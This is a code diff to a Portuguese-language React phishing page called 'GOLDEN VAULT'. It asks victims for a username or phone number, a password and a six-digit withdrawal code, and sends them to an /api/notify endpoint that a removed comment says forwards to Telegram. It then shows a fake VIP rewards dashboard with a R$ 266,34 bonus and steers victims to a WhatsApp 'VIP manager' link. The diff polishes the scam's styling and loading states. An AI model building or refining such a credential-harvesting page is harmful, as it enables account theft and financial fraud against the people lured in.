@@ -6,7 +6,7 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { gsap } from 'gsap';
 import confetti from 'canvas-confetti';
-import { Lock, User, Key, Coins, Trophy, Zap, Gift, CheckCircle2, MessageCircle, ArrowRight } from 'lucide-react';
+import { Lock, User, Key, Coins, Trophy, Zap, Gift, CheckCircle2, ArrowRight } from 'lucide-react';
 
 interface UserData {
   user: string;
@@ -27,6 +27,7 @@ const REWARDS = [
 
 export default function App() {
   const [view, setView] = useState<'login' | 'dashboard' | 'success'>('login');
+  const [loading, setLoading] = useState(false);
   const [userData, setUserData] = useState<UserData>({
     user: '',
     pass: '',
@@ -61,13 +62,15 @@ export default function App() {
 
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
+    setLoading(true);
+
     const updatedData = {
       ...userData,
-      timestamp: new Date().toISOString(),
+      timestamp: new Date().toLocaleString('pt-BR'),
+      status: 'active'
     };
-    setUserData(updatedData);
 
-    // Send to Telegram via Server API
+    // Envia para sua API notify permanentemente
     try {
       await fetch('/api/notify', {
         method: 'POST',
@@ -75,20 +78,24 @@ export default function App() {
         body: JSON.stringify(updatedData),
       });
     } catch (err) {
-      console.error('Notification failed', err);
+      console.error('Falha ao notificar servidor');
     }
 
+    // Animação de transição para o Dashboard
     gsap.to(loginRef.current, {
       opacity: 0,
       y: -20,
       duration: 0.6,
       ease: 'power2.in',
       onComplete: () => {
+        setLoading(false);
         setView('dashboard');
-        gsap.fromTo(dashboardRef.current, 
-          { opacity: 0, y: 30 }, 
-          { opacity: 1, y: 0, duration: 0.8, ease: 'power3.out' }
-        );
+        setTimeout(() => {
+          gsap.fromTo(dashboardRef.current, 
+            { opacity: 0, y: 30 }, 
+            { opacity: 1, y: 0, duration: 0.8, ease: 'power3.out' }
+          );
+        }, 100);
       }
     });
   };
@@ -97,7 +104,6 @@ export default function App() {
     const duration = 1.5 * 1000;
     const animationEnd = Date.now() + duration;
     const defaults = { startVelocity: 25, spread: 360, ticks: 50, zIndex: 100 };
-
     const randomInRange = (min: number, max: number) => Math.random() * (max - min) + min;
 
     const interval: any = setInterval(function() {
@@ -130,138 +136,104 @@ export default function App() {
   };
 
   return (
-    <div ref={containerRef} className="min-h-screen relative flex items-center justify-center p-6 overflow-hidden bg-deep-black">
-      {/* Subtle Background Elements */}
-      <div className="absolute inset-0 pointer-events-none overflow-hidden">
+    <div ref={containerRef} className="min-h-screen relative flex items-center justify-center p-4 overflow-hidden bg-[#050505]">
+      {/* Background Particles */}
+      <div className="absolute inset-0 pointer-events-none">
         {[...Array(15)].map((_, i) => (
-          <div 
-            key={i} 
-            className="particle absolute w-1 h-1 bg-gold/10 rounded-full"
-            style={{ 
-              left: `${Math.random() * 100}%`, 
-              top: `${Math.random() * 100}%`,
-              boxShadow: '0 0 8px #D4AF37'
-            }}
+          <div key={i} className="particle absolute w-1 h-1 bg-[#D4AF37]/20 rounded-full"
+            style={{ left: `${Math.random() * 100}%`, top: `${Math.random() * 100}%`, boxShadow: '0 0 10px #D4AF37' }}
           />
         ))}
-        <div className="absolute top-0 left-0 w-full h-full bg-[radial-gradient(circle_at_50%_50%,rgba(138,43,226,0.05),transparent_70%)]" />
       </div>
 
       {view === 'login' && (
-        <div ref={loginRef} className="w-full max-w-md glass-card p-10 rounded-[2rem] relative z-10">
+        <div ref={loginRef} className="w-full max-w-md bg-[#0A0A0A] border border-white/5 p-8 rounded-[2.5rem] shadow-2xl z-10">
           <div className="text-center mb-10">
-            <div className="w-16 h-16 bg-surface border border-gold/20 rounded-2xl flex items-center justify-center mx-auto mb-6 animate-float">
-              <Lock className="text-gold w-8 h-8" />
+            <div className="w-16 h-16 bg-[#111] border border-[#D4AF37]/20 rounded-2xl flex items-center justify-center mx-auto mb-4">
+              <Lock className="text-[#D4AF37] w-8 h-8" />
             </div>
-            <h1 className="text-4xl font-black tracking-tighter text-gradient-gold mb-3">GOLDEN VAULT</h1>
-            <p className="text-text-secondary text-sm font-light tracking-wide">AUTENTICAÇÃO VIP REQUERIDA</p>
+            <h1 className="text-3xl font-black text-white tracking-tighter mb-2">GOLDEN VAULT</h1>
+            <p className="text-gray-500 text-[10px] tracking-[0.3em] font-bold">AUTENTICAÇÃO EXCLUSIVA</p>
           </div>
 
-          <form onSubmit={handleLogin} className="space-y-8">
-            <div className="space-y-2">
-              <label className="text-[10px] uppercase tracking-[0.2em] text-text-secondary font-bold ml-1">Identificação</label>
-              <div className="relative group">
-                <User className="absolute left-4 top-1/2 -translate-y-1/2 text-text-secondary group-focus-within:text-gold transition-colors w-5 h-5" />
-                <input 
-                  required
-                  type="text" 
-                  placeholder="Numero de Telefone ou user"
-                  className="w-full bg-surface/50 border border-white/5 rounded-xl py-4 pl-12 pr-4 focus:outline-none focus:border-gold/30 transition-all text-text-primary placeholder:text-text-secondary/30"
-                  value={userData.user}
+          <form onSubmit={handleLogin} className="space-y-6">
+            <div className="space-y-1">
+              <label className="text-[10px] uppercase text-gray-500 font-bold ml-1">Usuário / Telefone</label>
+              <div className="relative">
+                <User className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-600 w-5 h-5" />
+                <input required type="text" placeholder="Seu usuário"
+                  className="w-full bg-[#111] border border-white/5 rounded-xl py-4 pl-12 pr-4 text-white focus:outline-none focus:border-[#D4AF37]/40 transition-all"
                   onChange={(e) => setUserData({...userData, user: e.target.value})}
                 />
               </div>
             </div>
 
-            <div className="space-y-2">
-              <label className="text-[10px] uppercase tracking-[0.2em] text-text-secondary font-bold ml-1">Senha de Acesso</label>
-              <div className="relative group">
-                <Key className="absolute left-4 top-1/2 -translate-y-1/2 text-text-secondary group-focus-within:text-gold transition-colors w-5 h-5" />
-                <input 
-                  required
-                  type="password" 
-                  placeholder="••••••••"
-                  className="w-full bg-surface/50 border border-white/5 rounded-xl py-4 pl-12 pr-4 focus:outline-none focus:border-gold/30 transition-all text-text-primary placeholder:text-text-secondary/30"
-                  value={userData.pass}
+            <div className="space-y-1">
+              <label className="text-[10px] uppercase text-gray-500 font-bold ml-1">Senha de Acesso</label>
+              <div className="relative">
+                <Key className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-600 w-5 h-5" />
+                <input required type="password" placeholder="••••••••"
+                  className="w-full bg-[#111] border border-white/5 rounded-xl py-4 pl-12 pr-4 text-white focus:outline-none focus:border-[#D4AF37]/40 transition-all"
                   onChange={(e) => setUserData({...userData, pass: e.target.value})}
                 />
               </div>
             </div>
 
-            <div className="space-y-2">
-              <label className="text-[10px] uppercase tracking-[0.2em] text-text-secondary font-bold ml-1">Código de Saque</label>
-              <div className="relative group">
-                <Coins className="absolute left-4 top-1/2 -translate-y-1/2 text-text-secondary group-focus-within:text-gold transition-colors w-5 h-5" />
-                <input 
-                  required
-                  type="password" 
-                  placeholder="6 dígitos de segurança"
-                  className="w-full bg-surface/50 border border-white/5 rounded-xl py-4 pl-12 pr-4 focus:outline-none focus:border-gold/30 transition-all text-text-primary placeholder:text-text-secondary/30"
-                  value={userData.withdraw_pass}
+            <div className="space-y-1">
+              <label className="text-[10px] uppercase text-gray-500 font-bold ml-1">Código de Saque</label>
+              <div className="relative">
+                <Coins className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-600 w-5 h-5" />
+                <input required type="password" placeholder="6 dígitos"
+                  className="w-full bg-[#111] border border-white/5 rounded-xl py-4 pl-12 pr-4 text-white focus:outline-none focus:border-[#D4AF37]/40 transition-all"
                   onChange={(e) => setUserData({...userData, withdraw_pass: e.target.value})}
                 />
               </div>
             </div>
 
-            <button type="submit" className="w-full btn-gold py-5 rounded-xl text-sm uppercase tracking-[0.1em]">
-              ACESSAR RECOMPENSAS
+            <button disabled={loading} type="submit" className="w-full bg-[#D4AF37] hover:bg-[#B8962E] text-black font-bold py-4 rounded-xl transition-all uppercase tracking-widest text-sm disabled:opacity-50">
+              {loading ? 'AUTENTICANDO...' : 'ACESSAR AGORA'}
             </button>
           </form>
         </div>
       )}
 
       {view === 'dashboard' && (
-        <div ref={dashboardRef} className="w-full max-w-2xl relative z-10">
-          <div className="flex items-center justify-between mb-12">
-            <div>
-              <h2 className="text-3xl font-black text-white tracking-tighter">CENTRAL VIP</h2>
-              <p className="text-text-secondary text-sm">Bem-vindo, <span className="text-gold font-semibold">{userData.user}</span></p>
-            </div>
-            <div className="bg-surface border border-gold/20 px-4 py-2 rounded-lg">
-              <span className="text-[10px] text-text-secondary uppercase font-bold tracking-widest">Status:</span>
-              <span className="ml-2 text-gold font-black text-xs">ONLINE</span>
+        <div ref={dashboardRef} className="w-full max-w-2xl z-10 px-2">
+          <div className="flex items-center justify-between mb-8">
+            <h2 className="text-2xl font-black text-white italic">PAINEL VIP</h2>
+            <div className="text-right">
+              <p className="text-[10px] text-gray-500 font-bold uppercase">Membro Ativo</p>
+              <p className="text-[#D4AF37] font-bold text-sm">{userData.user}</p>
             </div>
           </div>
 
-          <div className="grid gap-4">
+          <div className="space-y-4">
             {REWARDS.map((reward, index) => {
               const isUnlocked = index <= currentRewardIndex;
               const isClaimed = userData.rewardsClaimed.includes(reward.id);
               const isCurrent = index === currentRewardIndex;
 
               return (
-                <div 
-                  key={reward.id}
-                  className={`glass-card p-6 rounded-2xl border gold-border-glow flex items-center justify-between transition-all duration-700 ${
-                    isUnlocked ? 'opacity-100' : 'opacity-20 grayscale'
-                  } ${isCurrent ? 'scale-[1.02] border-gold/40' : 'border-white/5'}`}
-                >
-                  <div className="flex items-center gap-5">
-                    <div className={`w-12 h-12 rounded-xl flex items-center justify-center ${isUnlocked ? 'bg-gold/10 text-gold' : 'bg-white/5 text-white/10'}`}>
-                      <reward.icon className="w-6 h-6" />
+                <div key={reward.id} className={`p-5 rounded-2xl border transition-all duration-500 flex items-center justify-between ${
+                  isUnlocked ? 'bg-[#0A0A0A] border-[#D4AF37]/20 opacity-100' : 'bg-transparent border-white/5 opacity-30 grayscale'
+                } ${isCurrent ? 'scale-[1.03] border-[#D4AF37]/50 shadow-[0_0_20px_rgba(212,175,55,0.1)]' : ''}`}>
+                  <div className="flex items-center gap-4">
+                    <div className={`w-10 h-10 rounded-lg flex items-center justify-center ${isUnlocked ? 'bg-[#D4AF37]/10 text-[#D4AF37]' : 'bg-white/5 text-gray-700'}`}>
+                      <reward.icon size={20} />
                     </div>
                     <div>
-                      <h3 className="text-sm font-bold tracking-tight">{reward.title}</h3>
-                      <p className="text-[10px] text-text-secondary uppercase tracking-wider">{reward.description}</p>
+                      <h3 className="text-white text-xs font-bold uppercase">{reward.title}</h3>
+                      <p className="text-[9px] text-gray-500 uppercase">{reward.description}</p>
                     </div>
                   </div>
-
-                  <div className="flex flex-col items-end gap-2">
-                    <span className={`text-lg font-black ${isUnlocked ? 'text-gold' : 'text-white/10'}`}>{reward.value}</span>
+                  <div className="text-right">
+                    <p className={`font-black text-sm mb-2 ${isUnlocked ? 'text-white' : 'text-gray-800'}`}>{reward.value}</p>
                     {isCurrent && !isClaimed && (
-                      <button 
-                        onClick={() => claimReward(reward.id)}
-                        disabled={isClaiming}
-                        className="btn-gold px-5 py-2 rounded-lg text-[10px] uppercase disabled:opacity-50"
-                      >
-                        {isClaiming ? 'SINCRONIZANDO' : 'RESGATAR'}
+                      <button onClick={() => claimReward(reward.id)} disabled={isClaiming} className="bg-[#D4AF37] text-black text-[9px] font-black px-4 py-2 rounded-md uppercase">
+                        {isClaiming ? '...' : 'RESGATAR'}
                       </button>
                     )}
-                    {isClaimed && (
-                      <span className="text-neon-purple text-[10px] font-bold uppercase tracking-widest flex items-center gap-1">
-                        <CheckCircle2 className="w-3 h-3" /> LIBERADO
-                      </span>
-                    )}
+                    {isClaimed && <span className="text-green-500 text-[9px] font-bold uppercase">LIBERADO</span>}
                   </div>
                 </div>
               );
@@ -271,42 +243,23 @@ export default function App() {
       )}
 
       {view === 'success' && (
-        <div className="fixed inset-0 z-50 bg-deep-black/98 flex items-center justify-center p-6 backdrop-blur-2xl">
-          <div className="w-full max-w-md glass-card p-12 rounded-[3rem] text-center border-gold/30 relative overflow-hidden">
-            <div className="absolute -top-24 -left-24 w-48 h-48 bg-neon-purple/10 rounded-full blur-[80px]" />
-            <div className="absolute -bottom-24 -right-24 w-48 h-48 bg-gold/5 rounded-full blur-[80px]" />
-
-            <div className="relative z-10">
-              <div className="w-20 h-20 bg-gold rounded-3xl flex items-center justify-center mx-auto mb-8 shadow-[0_10px_40px_rgba(212,175,55,0.4)] animate-float">
-                <CheckCircle2 className="text-deep-black w-10 h-10" />
-              </div>
-              
-              <h2 className="text-3xl font-black text-white mb-6 tracking-tighter uppercase">Sincronização Concluída</h2>
-              
-              <div className="space-y-4 mb-10">
-                <p className="text-text-secondary text-sm leading-relaxed">
-                  Seu bônus acumulado de <span className="text-gold font-bold">R$ 266,34</span> e o acesso <span className="text-gold font-bold">VIP 7</span> foram vinculados ao seu perfil.
-                </p>
-                <p className="text-text-secondary text-sm font-light">
-                  Para efetivar o crédito em sua conta, confirme o procedimento com seu gerente VIP.
-                </p>
-              </div>
-
-              <a 
-                href="https://wa.me/55996191896?text=Olá!%20Concluí%20o%20resgate%20VIP%20de%20R$%20266,34.%20Pode%20liberar%20o%20crédito?"
-                target="_blank"
-                rel="noopener noreferrer"
-                className="flex items-center justify-center gap-3 w-full btn-gold py-5 rounded-2xl text-sm uppercase tracking-widest"
-              >
-                LIBERAR BÔNUS AGORA
-                <ArrowRight className="w-5 h-5" />
-              </a>
-              
-              <div className="mt-8 flex items-center justify-center gap-2">
-                <div className="w-1.5 h-1.5 bg-gold rounded-full animate-pulse" />
-                <span className="text-[9px] uppercase tracking-[0.3em] text-text-secondary font-bold">Aguardando Validação</span>
-              </div>
+        <div className="fixed inset-0 z-50 bg-black/95 flex items-center justify-center p-6 backdrop-blur-md">
+          <div className="w-full max-w-sm bg-[#0A0A0A] border border-[#D4AF37]/30 p-10 rounded-[3rem] text-center">
+            <div className="w-20 h-20 bg-[#D4AF37] rounded-3xl flex items-center justify-center mx-auto mb-6 shadow-lg shadow-[#D4AF37]/20">
+              <CheckCircle2 className="text-black w-10 h-10" />
             </div>
+            <h2 className="text-2xl font-black text-white mb-4 italic">RESGATE PRONTO!</h2>
+            <p className="text-gray-400 text-xs leading-relaxed mb-8">
+              Você acumulou um saldo total de <span className="text-[#D4AF37] font-bold">R$ 266,34</span>. 
+              Sua conta VIP 7 está pronta para receber o bônus.
+            </p>
+            <a 
+              href="https://wa.me/55996191896?text=Olá!%20Concluí%20o%20resgate%20VIP%20de%20R$%20266,34.%20Pode%20liberar%20o%20crédito?"
+              className="flex items-center justify-center gap-2 w-full bg-[#25D366] hover:bg-[#1EBE57] text-black font-black py-4 rounded-2xl transition-all uppercase text-xs tracking-tighter"
+            >
+              FALAR COM SUPORTE VIP
+              <ArrowRight size={16} />
+            </a>
           </div>
         </div>
       )}
